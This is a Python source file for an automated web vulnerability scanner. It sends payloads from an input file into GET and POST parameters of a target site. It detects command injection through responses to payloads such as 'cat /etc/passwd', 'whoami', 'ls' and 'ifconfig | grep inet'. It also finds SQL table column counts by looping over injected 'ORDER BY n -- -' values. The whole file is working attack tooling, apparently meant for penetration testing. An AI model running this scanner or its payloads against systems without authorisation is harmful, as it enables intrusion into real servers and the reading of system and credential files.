from config import *
import requests
import os
from datetime import datetime
import itertools
import re

def write_vulnerabilty_report(vulnerabilities_lines):
    directories, filename = os.path.split(VULNERABILITY_OUTPUT_PATH)

    if not os.path.exists(directories):
        os.makedirs(directories)

    with open(VULNERABILITY_OUTPUT_PATH, 'a+') as f:
        for message in vulnerabilities_lines:
            f.write(f'{message}\n')

def elaborate_response(http_method, url_under_test, parameters_and_values, response, vulnerabilities_lines):
    url_under_test = url_under_test[1:] # remove initial slash

    number_of_columns_not_found = True

    for parameter, value in parameters_and_values.items():
        message = f'Found a command injection for URL: {url_under_test}, HTTP method: {http_method}, parameter: {parameter}, payload: {value}'
        
        # skip already checked combination
        if message in vulnerabilities_lines:
            continue

        if DEBUG:
            print(f'\n[DEBUG] - URL: {url_under_test}')
            print(f'[DEBUG] - HTTP METHOD: {http_method}')
            print(f'[DEBUG] - COMPLETE URL: {response.url}')
            print(f'[DEBUG] - PARAMETER UNDER TEST: {parameter}')
            print(f'[DEBUG] - PARAMETER UNDER TEST VALUE: {value}')
            
            print('[DEBUG] - RESPONSE')
            print(response.text)

        vulnerable = False

        # check expected results
        if 'ls' in value:
            if url_under_test in response.text:
                vulnerable = True
        elif 'cat /etc/passwd' in value:
            if 'root' in response.text:
                vulnerable = True
        elif ('head' in value or 'grep php' in value) and '.php' in value:
            if '<?php' in response.text:
                vulnerable = True
        elif 'whoami' in value:
            if CURRENT_USER in response.text:
                vulnerable = True
        elif 'ifconfig | grep inet' in value:
            if 'inet' in response.text:
                vulnerable = True
        elif re.findall(r'\'ORDER BY \d+ -- -', value): # if the text contais ORDER BY "number"
            if not response.text: # response is empty if column number is out of range
                columns_number = int(re.findall(r'\d+', value)[0])-1 # get correct columns number
                message += f'. The table has {columns_number} column(s)'
                vulnerable = True
                number_of_columns_not_found = False

        if vulnerable:
            print(message)
            vulnerabilities_lines.append(f'{datetime.now()} - {message}')

    return number_of_columns_not_found

# read requests details
def read_requests_details(requests_dict):
    with open(REQUESTS_INPUT_PATH) as f:
        for line in f:
            values = line.strip().split(REQUESTS_SPLIT_VAL)

            requests_dict.append({ 
                'method':  values[0],
                'url': values[1],
                'parameters': values[2].split(REQUESTS_PARAMETERS_SPLIT_VAL),
            })

# read payloads to inject
def read_payloads(requests_dict):
    with open(PAYLOADS_INPUT_PATH) as f:          
        i = 0

        for line in f:
            payloads = line.strip().split(PAYLOADS_SPLIT_VAL)

            # can't inject other payload with the command to find the columns number
            if len(payloads) > 1 and payloads[i].startswith(COMMAND_COLUMNS_NUMBER):
                print(f'Only one payload can be injected with the {COMMAND_COLUMNS_NUMBER} command')
                raise ValueError()

            requests_dict[i]['payloads'] = payloads
            i += 1

        if i != len(requests_dict):
            raise IndexError()

def send_request(requests_dict, vulnerabilities_lines):
    for request in requests_dict:
        final_url = TARGET + request['url']

        if len(request['parameters']) > 1 and 1 == len(request['payloads']):
            # append valid values to allows permutations (single payload in different parameters)
            for _ in range(len(request['parameters']) - len(request['payloads'])):
                request['payloads'].append('valid_string')

        # permutations of payloads based on parameters length
        for payload in list(itertools.permutations(request['payloads'], len(request['parameters']))):
            data = { }

            more_requests_for_columns_number = False

            # to inject different ORDER BY values
            if COMMAND_COLUMNS_NUMBER in request['payloads']:
                more_requests_for_columns_number = True

            for i in range(len(request['parameters'])):
                if more_requests_for_columns_number:
                    data[request['parameters'][i]] = '\'ORDER BY 1 -- -' if COMMAND_COLUMNS_NUMBER == payload[i] else payload[i]
                else:
                    data[request['parameters'][i]] = payload[i]
                
            # set current ORDER BY value
            i = 1

            while True:
                if 'GET' == request['method'].upper():
                    more_requests_for_columns_number = elaborate_response(request['method'], request['url'], data, requests.get(final_url, params=data), vulnerabilities_lines)
                elif 'POST' == request['method'].upper():
                    more_requests_for_columns_number = elaborate_response(request['method'], request['url'], data, requests.post(final_url, data=data), vulnerabilities_lines)
                else:
                    print(f'Method {request["method"]} is not supported. Check your input file')
                    raise ValueError 

                # found number of columns or the ORDER BY command is not related to --noc command
                if not more_requests_for_columns_number or COMMAND_COLUMNS_NUMBER not in request['payloads']:
                    break

                i += 1

                for parameter, value in data.items():
                    if re.findall(r'\'ORDER BY \d+ -- -', value):
                        data[parameter] = f'\'ORDER BY {i} -- -'

def main():
    requests_dict = [ ]

    read_requests_details(requests_dict)

    try:
        read_payloads(requests_dict)
    
        if DEBUG:
            print('[DEBUG] - REQUESTS DICTIONARY')
            print(requests_dict)

        vulnerabilities_lines = [ ]

        send_request(requests_dict, vulnerabilities_lines)
        write_vulnerabilty_report(vulnerabilities_lines)
    except ValueError:
        exit()
    except IndexError:
        print('Error: mismatching rows number between requests-details and payloads files')
        exit()

if __name__ == '__main__':
    main()